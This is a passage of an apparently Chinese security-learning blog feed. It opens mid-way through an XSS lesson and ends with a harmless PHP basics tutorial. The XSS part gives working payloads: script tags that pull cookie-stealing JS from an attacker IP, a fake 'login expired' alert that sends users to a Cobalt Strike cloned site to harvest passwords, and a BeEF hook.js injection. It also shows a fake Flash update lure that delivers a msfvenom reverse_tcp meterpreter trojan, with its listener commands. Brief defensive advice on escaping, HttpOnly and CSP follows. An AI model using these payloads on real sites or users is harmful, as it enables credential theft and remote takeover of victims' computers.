romeoz/docker-apache-php:5.6</span><br></pre></td></tr></table></figure><p>-v挂载宿主机目录（.&#x2F;bluelotus为宿主机的目录）<br>常见问题：可能由于docker版本不同的原因，挂载的目录为相对路径的话会出现错误，可以将相对路径修改为绝对路径（相对路径与绝对路径在【linux基础与docker】里介绍过），比如：<br>第三步：修改配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> ./bluelouts/config-sample.php ./bluelouts/config.php</span><br><span class="line"><span class="built_in">chmod</span> -R 777 ./bluelouts/myjs</span><br><span class="line"><span class="built_in">chmod</span> -R 777 ./bluelouts/data</span><br></pre></td></tr></table></figure><p>第四步：访问<code>http://your-ip:port/login.php</code>，比如我XSS平台的宿主机IP为192.168.81.233，docker的端口为9944，则访问<code>http://192.168.81.233:9944/login.php</code>，密码为：bluelotus<br>第五步：在【我的JS】里选择插入【default】模板，文件名随意。<br>第六步：修改模板里的“网络地址”为平台的地址，并点击【新增】。<br>到这里平台搭建完成。<br>常见问题：关机了之后再开启并且启动了容器但是还是访问不到，这是由于容器里的WEB服务没有正常启动，可以重启一下docker再启动容器或者重启一下虚拟机再启动docker与容器然后【生成payload】。<br>将payload插入到存在漏洞的地方</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.81.233:9944/myjs/aaa.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>受害者视角</strong><br>今天高高兴兴的正常登录网站浏览网站的功能，不知不觉中，自己的Cookie信息就被别人拿到了。</p><p><strong>攻击者视角</strong><br>在搭建的XSS平台收到Cookie。</p><h5 id="3-Cookie利用"><a href="#3-Cookie利用" class="headerlink" title="(3) Cookie利用"></a>(3) Cookie利用</h5><p>攻击者在受害者没有退出网站之前利用获取的Cookie进行登录，首先访问获取的信息中的location发现需要登录然后构造Cookie，将获取的Cookie进行填充或替代，然后访问location的链接即可免密登录到网站。</p><h4 id="2-网络钓鱼"><a href="#2-网络钓鱼" class="headerlink" title="2. 网络钓鱼"></a>2. 网络钓鱼</h4><p>钓鱼网站是指欺骗用户的虚假网站。“钓鱼网站”的页面与真实网站界面基本一致，欺骗消费者或者窃取访问者提交的账号和密码信息。钓鱼网站一般只有一个或几个页面，和真实网站差别细微。钓鱼网站是互联网中最常碰到的一种诈骗方式，通常伪装成银行及电子商务、窃取用户提交的银行账号、密码等私密信息的网站。网络钓鱼是犯罪分子最容易实施的网络攻击方式之一，也是最容易上当的方式之一。它还可以为黑客提供所需的一切，以洗劫其目标的个人和工作帐户。<br>网络钓鱼也是网络攻击者传播恶意软件的一种流行方法，通过鼓励受害者下载一个文件或访问一个链接，秘密安装恶意有效载荷，从而进行传播木马恶意软件、勒索软件或各种破坏性和破坏性攻击。</p><h5 id="1-Flash钓鱼"><a href="#1-Flash钓鱼" class="headerlink" title="(1) Flash钓鱼"></a>(1) Flash钓鱼</h5><h6 id="A-Flash"><a href="#A-Flash" class="headerlink" title="A. Flash"></a>A. Flash</h6><p>Flash player是一种广泛使用的、专有的多媒体程序播放器。Flash Player使用矢量图形的技术来最小化文件的大小以及创造节省网络带宽和下载时间的文件。因此Flash成为嵌入网页中的小游戏、动画以及图形用户界面常用的格式。</p><h6 id="B-Flash官网页面伪造"><a href="#B-Flash官网页面伪造" class="headerlink" title="B. Flash官网页面伪造"></a>B. Flash官网页面伪造</h6><p>真实的Flash官网伪造的Flash官网（除了网址不同其他地方相同）</p><p><strong>攻击者视角</strong></p><ol><li>首先下载相关文件，解压后将Flash相关文件放到WEB网站根目录里，这里以安装了apache的docker镜像为例（可以直接用上节课中的镜像）：</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -p 9944:80 -v ./02-fakeflash:/var/www/app romeoz/docker-apache-php:5.6</span><br></pre></td></tr></table></figure><p>再将index.html重命名为index.php。<br>2. 编辑flash.js文件，将window.location.href修改为index.php的url地址，该文件的作用为插入一个iframe内联框架。<br>3. 向存在XSS漏洞的地方插入payload：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.81.233:9944/flash.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>受害者视角</strong><br>像平常一样在互联网冲浪，点击到插入了xss代码的页面，突然弹出一个框如果没有太大的警觉心就会觉得确实是flash版本太低了，点击确定就会跳转到攻击者伪造的flash官网页面然后就会下载攻击者生成的恶意文件并安装执行。</p><h5 id="2-Cobalt-Strike钓鱼"><a href="#2-Cobalt-Strike钓鱼" class="headerlink" title="(2) Cobalt Strike钓鱼"></a>(2) Cobalt Strike钓鱼</h5><h6 id="A-Cobalt-Strike"><a href="#A-Cobalt-Strike" class="headerlink" title="A. Cobalt Strike"></a>A. Cobalt Strike</h6><p>Cobalt Strike（简称为CS）是一款团队作战渗透测试神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户端连接。</p><h6 id="B-克隆网站"><a href="#B-克隆网站" class="headerlink" title="B. 克隆网站"></a>B. 克隆网站</h6><ol><li>首先将Cobalt Strike程序下载下来，然后放到kali里（需要有jdk环境，kali自带）。</li><li>给程序执行的权限并启动服务端：</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x teamserver</span><br><span class="line"><span class="built_in">sudo</span> ./teamserver kali的ip 密码</span><br></pre></td></tr></table></figure><ol start="3"><li>启动客户端：</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x cobaltstrike</span><br><span class="line"><span class="built_in">sudo</span> ./cobaltstrike</span><br></pre></td></tr></table></figure><p>Host填写服务端的IP，Port默认50050，User随意填写，Password为启动时的密码。<br>4. 开始克隆，选择攻击–》钓鱼攻击–》克隆网站然后通过克隆好的网站通过某种方法发送给受害者，比如短信钓鱼、邮件钓鱼、或者是XSS漏洞。<br>克隆好的网站：将下面js文件代码修改window.location.href为克隆生成的地址并放到网站目录里：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line"> <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;IFRAME&quot;</span>);</span><br><span class="line"> iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line"> iframe.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&#x27;date:text/plain&#x27;</span>);</span><br><span class="line"> <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line"> <span class="variable language_">window</span>.<span class="property">frames</span> [<span class="number">0</span>].<span class="property">window</span>.<span class="title function_">alert</span>(name);</span><br><span class="line"> iframe.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(iframe);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;登陆过期，请重新登陆！&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://192.168.220.129/&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在存在xss漏洞的地方插入payload：</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js文件的地址&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>受害者视角</strong><br>像平常登录网站，提示登录过期，遂输入用户名密码，殊不知输入的账号密码已经被攻击者获取了。</p><p><strong>攻击者视角</strong><br>受害者输入账号密码即可被攻击者获取到。</p><h5 id="3-Beef钓鱼"><a href="#3-Beef钓鱼" class="headerlink" title="(3) Beef钓鱼"></a>(3) Beef钓鱼</h5><h6 id="A-Beef"><a href="#A-Beef" class="headerlink" title="A. Beef"></a>A. Beef</h6><p>BeEF(The Browser Exploitation Framework)是浏览器攻击框架的简称，是一款专注于浏览器端的渗透测试工具。</p><h6 id="B-Beef攻击原理"><a href="#B-Beef攻击原理" class="headerlink" title="B. Beef攻击原理"></a>B. Beef攻击原理</h6><p>BeEF提供一个Web界面来进行操作，只要访问了嵌入hook.js的页面，抑或执行了hook.js文件的浏览器，就会不断地以GET的方式将其自身的相关信息传到BeEF的服务端。<br>服务器端：beef作为服务端管理，管理访问运行了hook的客户端。<br>客户端：运行于客户端浏览器的Javascript脚本（hook），也就是beef生成的payload。<br>beef将运行了hook的web浏览器钩住，进行管理。</p><h6 id="C-Beef攻击手段"><a href="#C-Beef攻击手段" class="headerlink" title="C. Beef攻击手段"></a>C. Beef攻击手段</h6><ul><li>配合xss，将hook插入到存在xss的注入处。</li><li>直接诱使客户端访问含有hook的伪造站点。</li><li>结合中间人攻击注入hook脚本。</li></ul><h6 id="D-Beef的使用"><a href="#D-Beef的使用" class="headerlink" title="D. Beef的使用"></a>D. Beef的使用</h6><ol><li><p><strong>安装Beef</strong><br>最新的kali系统已经不会默认安装BeEF，需要我们自行安装。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install beef-xss</span><br></pre></td></tr></table></figure></li><li><p><strong>启动Beef</strong><br>可以使用命令启动：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> beef-xss</span><br></pre></td></tr></table></figure><p>也可以鼠标点击启动。<br>第一次启动需要配置密码，用户名默认是beef。<br>如果出现错误，则可以尝试以下命令进行重装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove ruby</span><br><span class="line">apt remove beef-xss</span><br><span class="line">apt-get install ruby</span><br><span class="line">apt-get install ruby-dev libpcap-dev</span><br><span class="line">gem install eventmachine</span><br><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure></li><li><p><strong>利用Beef进行攻击钓鱼</strong><br>实际上启动界面已经给了攻击代码了：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.220.129:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将攻击代码插入到存在漏洞的地方。</p></li></ol><p><strong>攻击者视角</strong><br>可以看到已经上线了控制对方的浏览器。</p><p><strong>受害者视角</strong><br>无感知。</p><h4 id="3-流量劫持"><a href="#3-流量劫持" class="headerlink" title="3. 流量劫持"></a>3. 流量劫持</h4><p>流量劫持是指利用一些软件或者木马修改浏览器不停的弹出新的窗口强制性的让用户访问指定的网站。在漏洞处插入payload:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="四、跨站脚本攻击漏洞修复"><a href="#四、跨站脚本攻击漏洞修复" class="headerlink" title="四、跨站脚本攻击漏洞修复"></a>四、跨站脚本攻击漏洞修复</h3><h4 id="1-输入过滤"><a href="#1-输入过滤" class="headerlink" title="1. 输入过滤"></a>1. 输入过滤</h4><p>对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的内容提交，阻止或者忽略除此外的其他任何数据。</p><h4 id="2-输出转义"><a href="#2-输出转义" class="headerlink" title="2. 输出转义"></a>2. 输出转义</h4><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。<code>htmlspecialchars()</code>：把预定义的字符转换为HTML实体。<br>预定义的字符如下：</p><ul><li><code>&amp;</code>（和号）成为<code>&amp;amp;</code></li><li><code>&quot;</code>（双引号）成为<code>&amp;quot;</code></li><li><code>&#39;</code>（单引号）成为<code>&amp;#039;</code></li><li><code>&lt;</code>（小于）成为<code>&amp;lt;</code></li><li><code>&gt;</code>（大于）成为<code>&amp;gt;</code></li></ul><h4 id="3-使用http-only"><a href="#3-使用http-only" class="headerlink" title="3. 使用http-only"></a>3. 使用http-only</h4><p>HttpOnly是加在cookies上的一个标识，用于告诉浏览器不要向客户端脚本（document.cookie或其他）暴露cookie。当你在cookie上设置HttpOnly标识后，浏览器就会知会到这是特殊的cookie，只能由服务器检索到，所有来自客户端脚本的访问都会被禁止。<br>HttpOnly：禁止javascript读取，如果cookie中的一个参数带有HttpOnly，则这个参数将不能被javascript获取；HttpOnly可以防止xss会话劫持攻击。</p><h4 id="4-配合csp"><a href="#4-配合csp" class="headerlink" title="4. 配合csp"></a>4. 配合csp</h4><p>CSP（Content Security Policy）指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。<br>CSP本质上是建立白名单，规定了浏览器只能够执行特定来源的代码；即使发生了xss攻击，也不会加载来源不明的第三方脚本。</p><h3 id="五、拓展"><a href="#五、拓展" class="headerlink" title="五、拓展"></a>五、拓展</h3><h4 id="1-XSS攻击Payload"><a href="#1-XSS攻击Payload" class="headerlink" title="1. XSS攻击Payload"></a>1. XSS攻击Payload</h4><p><a href="https://blog.csdn.net/qq_50854790/article/details/124297046">XSS攻击Payload</a></p><h4 id="2-Flash钓鱼获取服务器权限"><a href="#2-Flash钓鱼获取服务器权限" class="headerlink" title="2. Flash钓鱼获取服务器权限"></a>2. Flash钓鱼获取服务器权限</h4><h5 id="1-msfvenom"><a href="#1-msfvenom" class="headerlink" title="(1) msfvenom"></a>(1) msfvenom</h5><p>msfvenom是用来生成后门的软件。Msfvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。</p><h6 id="A-利用msfvenom生成木马"><a href="#A-利用msfvenom生成木马" class="headerlink" title="A. 利用msfvenom生成木马"></a>A. 利用msfvenom生成木马</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=kali的ip lport=任意端口 -f exe -o /var/www/htl/FlashUpdate.exe</span><br></pre></td></tr></table></figure><p>-p指定攻击载荷，目标主机是什么系统就用什么payload。<br>-f生成什么格式的木马。<br>-o生成的木马导出到哪里。</p><h5 id="2-metasploit"><a href="#2-metasploit" class="headerlink" title="(2) metasploit"></a>(2) metasploit</h5><p>The Metasploit Framework的简称。MSF高度模块化，即框架由多个module组成，是全球最受欢迎的渗透测试工具之一。是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p><h6 id="A-启动metasploit"><a href="#A-启动metasploit" class="headerlink" title="A. 启动metasploit"></a>A. 启动metasploit</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><h6 id="B-使用侦听模块并设置payload"><a href="#B-使用侦听模块并设置payload" class="headerlink" title="B. 使用侦听模块并设置payload"></a>B. 使用侦听模块并设置payload</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.186.133</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>exploit&#x2F;multi&#x2F;handler为侦听模块。<br>windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp为生成木马的时候所使用的payload。<br>lhost为生成木马是所指定的kali的ip。<br>lport为端口。</p><p>将flash弹窗图片复制到web目录里：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /usr/share/beef-xss/modules/social_engineering/fake_flash_update/img/eng.png /var/www/html</span><br></pre></td></tr></table></figure><p>然后启动apache：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure><p>准备好木马程序后，在BeEf的Commands模块下执行命令，进入Social Engineering -&gt; Fake Flash Update填写，受害者浏览器弹出flash更新提示，点击即可下载文件受害者下载运行该程序就会中招被攻击者拿下电脑控制权。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞</title>
      <link href="/2025/03/06/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/03/06/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础</title>
      <link href="/2025/02/19/PHP%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/02/19/PHP%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h3 id="一、PHP-代码基础"><a href="#一、PHP-代码基础" class="headerlink" title="一、PHP 代码基础"></a>一、PHP 代码基础</h3><ol><li><p><strong>注释</strong><br>PHP 支持单行注释 <code>//</code> 和多行注释 <code>/* ... */</code>，以及用 <code>#</code> 开头的注释。注释内容会被解析器忽略。</p></li><li><p><strong>输出内容</strong><br>使用 <code>echo</code> 关键字可将内容输出到页面。例如： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br></pre></td></tr></table></figure><p>PHP 代码可嵌入 HTML 中，动态生成页面内容。</p></li><li><p><strong>字符串拼接</strong><br>PHP 通过 <code>.</code> 操作符合并字符串，例如： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$message</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;老李&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$message</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$name</span>; <span class="comment">// 输出 &quot;Hello 老李&quot;</span></span><br></pre></td></tr></table></figure><p>若需格式化输出，可用双引号包裹变量（如 <code>&quot;$name&quot;</code>），单引号则直接输出字面值。</p></li></ol><h3 id="二、语法特性"><a href="#二、语法特性" class="headerlink" title="二、语法特性"></a>二、语法特性</h3><ol><li><p><strong>单双引号区别</strong><br>• 双引号解析变量（如 <code>&quot;$name&quot;</code>）和转义字符（如 <code>&quot;\n&quot;</code>）；<br>• 单引号仅输出字面值，需用 <code>\&#39;</code> 转义单引号本身。</p></li><li><p><strong>调试函数</strong><br><code>var_dump()</code> 可输出变量的类型、长度及值，常用于调试：  </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$domain</span> = <span class="string">&quot;example.com&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$domain</span>); <span class="comment">// 输出 string(11) &quot;example.com&quot;</span></span><br></pre></td></tr></table></figure><p>与 <code>echo</code> 不同，<code>var_dump()</code> 无返回值，仅用于调试。</p></li></ol><h1 id="变量与作用域"><a href="#变量与作用域" class="headerlink" title="变量与作用域"></a>变量与作用域</h1><p>今天我们来学习 PHP 的变量及其作用域，结合编程语言的共性特征与 PHP 的特性展开分析：</p><hr><h3 id="一、PHP-变量的基本概念"><a href="#一、PHP-变量的基本概念" class="headerlink" title="一、PHP 变量的基本概念"></a>一、PHP 变量的基本概念</h3><ol><li><p><strong>变量定义</strong><br>PHP 变量以美元符号 <code>$</code> 开头，后接变量名，通过 <code>=</code> 赋值。变量类型在运行时自动确定，<strong>无需显式声明</strong>。例如： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;张三&quot;</span>; <span class="comment">// 字符串类型</span></span><br><span class="line"><span class="variable">$age</span> = <span class="number">25</span>;      <span class="comment">// 整型</span></span><br></pre></td></tr></table></figure></li><li><p><strong>弱类型特性</strong><br>PHP 是动态类型语言，变量类型由值<strong>自动推断</strong>。例如，整型变量可被赋值为字符串：  </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$var</span> = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 自动转为字符串类型</span></span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="二、变量命名规则"><a href="#二、变量命名规则" class="headerlink" title="二、变量命名规则"></a>二、变量命名规则</h3><ol><li><p><strong>基本规范</strong><br>• 必须<strong>以字母或下划线开头</strong>，后接字母、数字或下划线。<br>• <strong>区分大小写</strong>（如 <code>$name</code> 与 <code>$Name</code> 不同）。<br>• 避免使用拼音或无意义缩写，推荐使用英文单词组合（如 <code>$userAge</code>）。</p></li><li><p><strong>命名风格</strong><br>• <strong>驼峰命名法</strong>：<code>$firstName</code>（小驼峰）或 <code>$FirstName</code>（大驼峰）。<br>• <strong>下划线命名法</strong>：<code>$user_age</code>（推荐用于常量或全局变量）。</p></li></ol><hr><h3 id="三、变量作用域"><a href="#三、变量作用域" class="headerlink" title="三、变量作用域"></a>三、变量作用域</h3><p>PHP 变量作用域分为以下四类，通过代码示例说明差异：</p><ol><li><p><strong>局部作用域（Local Scope）</strong><br>函数内部声明的变量仅在该函数内有效： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$localVar</span> = <span class="string">&quot;I&#x27;m local&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$localVar</span>; <span class="comment">// 报错：未定义变量</span></span><br></pre></td></tr></table></figure></li><li><p><strong>全局作用域（Global Scope）</strong><br>函数外部声明的变量需通过 <code>global</code> 关键字或 <code>$GLOBALS</code> 数组访问： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$globalVar</span> = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showGlobal</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$globalVar</span>; <span class="comment">// 引用全局变量</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$globalVar</span>;  <span class="comment">// 输出 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>静态作用域（Static Scope）</strong><br>使用 <code>static</code> 关键字声明的局部变量，其值在函数调用间保留： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$count</span>++;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$count</span>; <span class="comment">// 输出 1,2,3...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>参数作用域（Parameter Scope）</strong><br>函数参数作为局部变量，仅在函数内部有效： </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printName</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$name</span>; <span class="comment">// 输出传入的值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">printName</span>(<span class="string">&quot;张三&quot;</span>); <span class="comment">// 输出 &quot;张三&quot;</span></span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="四、特殊变量与注意事项"><a href="#四、特殊变量与注意事项" class="headerlink" title="四、特殊变量与注意事项"></a>四、特殊变量与注意事项</h3><ol><li><p><strong>未初始化变量</strong><br>PHP 未初始化的变量默认值为 <code>NULL</code>（布尔型）或空值（如空字符串、空数组）。 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$undefinedVar</span>; <span class="comment">// 类型为 NULL，empty() 返回 true</span></span><br></pre></td></tr></table></figure></li><li><p><strong>超全局变量</strong><br>如 <code>$_GET</code>、<code>$_POST</code> 等，可在任何作用域直接访问。</p></li><li><p><strong>变量引用与解引用</strong><br>• 引用：<code>$b = &amp;$a</code>，修改 <code>$b</code> 会影响 <code>$a</code>。<br>• 解引用：<code>$$b</code> 表示变量名由 <code>$b</code> 的值决定。</p></li></ol><h1 id="常量与数据类型"><a href="#常量与数据类型" class="headerlink" title="常量与数据类型"></a>常量与数据类型</h1><h3 id="一、PHP-常量"><a href="#一、PHP-常量" class="headerlink" title="一、PHP 常量"></a>一、PHP 常量</h3><ol><li><p><strong>定义与特性</strong><br>• 常量通过 <code>define()</code> 函数或 <code>const</code> 关键字定义，一旦创建不可修改。<br>• 常量名必须全大写（如 <code>MESSAGE</code>），默认大小写敏感，但 <code>define()</code> 的 <code>case_insensitive</code> 参数（PHP 7.3+）可设为 <code>true</code> 实现不敏感。<br>• 值只能是标量类型（整型、浮点型、布尔型、字符串），不能是数组、对象或资源。 </p></li><li><p><strong>推荐写法</strong><br>• 优先使用 <code>const</code> 关键字（PHP 5.3+），语法更简洁： </p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>• 避免使用 <code>define()</code> 的旧语法（已弃用），如： </p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;MESSAGE&quot;</span>, <span class="string">&quot;Hello&quot;</span>, <span class="literal">true</span>); <span class="comment">// 不推荐</span></span><br></pre></td></tr></table></figure></li><li><p><strong>作用域</strong><br>• 常量默认全局有效，无需 <code>global</code> 关键字即可在函数内访问。</p></li></ol><hr><h3 id="二、PHP-数据类型"><a href="#二、PHP-数据类型" class="headerlink" title="二、PHP 数据类型"></a>二、PHP 数据类型</h3><p>PHP 支持 9 种原始数据类型，分为以下三类： </p><h4 id="1-标量类型"><a href="#1-标量类型" class="headerlink" title="1. 标量类型"></a>1. <strong>标量类型</strong></h4><p>   • <strong>布尔型（Boolean）</strong>：<br>     ◦ 值为 <code>true</code> 或 <code>false</code>，不区分大小写（如 <code>TRUE</code>、<code>False</code> 均可）。<br>     ◦ 转换规则：<code>0</code>、<code>&quot;&quot;</code>、<code>null</code> 等值转为 <code>false</code>，其余为 <code>true</code>。<br>   • <strong>整型（Integer）</strong>：<br>     ◦ 整数（如 <code>42</code>、<code>-15</code>），支持十进制、十六进制（<code>0x</code>）、八进制（<code>0</code>）表示。<br>   • <strong>浮点型（Float）</strong>：<br>     ◦ 小数（如 <code>3.14</code>）或科学计数法（如 <code>2.5e2</code>）。<br>   • <strong>字符串（String）</strong>：<br>     ◦ 单引号或双引号包裹的文本，支持转义字符（如 <code>&quot;\n&quot;</code>）。  </p><h4 id="2-复合类型"><a href="#2-复合类型" class="headerlink" title="2. 复合类型"></a>2. <strong>复合类型</strong></h4><p>   • <strong>数组（Array）</strong>：<br>     ◦ 存储有序集合，可包含不同类型的元素（如 <code>[&quot;apple&quot;, 123](@ref)</code>）。<br>   • <strong>对象（Object）</strong>：<br>     ◦ 类的实例，包含属性和方法。  </p><h4 id="3-特殊类型"><a href="#3-特殊类型" class="headerlink" title="3. 特殊类型"></a>3. <strong>特殊类型</strong></h4><p>   • <strong>NULL</strong>：表示变量无值（如 <code>unset($var)</code> 或未定义的变量）。<br>   • <strong>资源（Resource）</strong>：<br>     ◦ 外部资源（如数据库连接、文件句柄），需手动释放。  </p><hr><h3 id="三、类型检测与转换"><a href="#三、类型检测与转换" class="headerlink" title="三、类型检测与转换"></a>三、类型检测与转换</h3><ol><li><p><strong>检测类型</strong><br>• 使用 <code>gettype()</code> 函数或类型判断函数（如 <code>is_int()</code>、<code>is_string()</code>）。<br>• 布尔值检测推荐 <code>is_bool()</code>，而非直接比较 <code>== true</code>。 </p></li><li><p><strong>类型转换</strong><br>• 弱类型语言特性：运算时自动转换（如字符串 <code>&quot;123&quot;</code> + <code>456</code> 结果为 <code>579</code>）。<br>• 强制转换：<code>(int)</code>、<code>(string)</code> 等语法。</p></li></ol><hr><h3 id="四、调试与最佳实践"><a href="#四、调试与最佳实践" class="headerlink" title="四、调试与最佳实践"></a>四、调试与最佳实践</h3><p>• <strong>调试</strong>：使用 <code>var_dump()</code> 查看变量类型和值，<code>defined()</code> 检查常量是否定义。<br>• <strong>命名规范</strong>：<br>  • 常量全大写，变量以 <code>$</code> 开头且具描述性（如 <code>$userAge</code>）。<br>  • 避免使用拼音或无意义缩写。 </p><h1 id="标量类型"><a href="#标量类型" class="headerlink" title="标量类型"></a>标量类型</h1><h3 id="一、浮点型（Float）"><a href="#一、浮点型（Float）" class="headerlink" title="一、浮点型（Float）"></a>一、浮点型（Float）</h3><p>浮点型用于表示小数，但存在精度问题，<strong>永远不要直接比较两个浮点数是否相等</strong>。例如：</p><figure 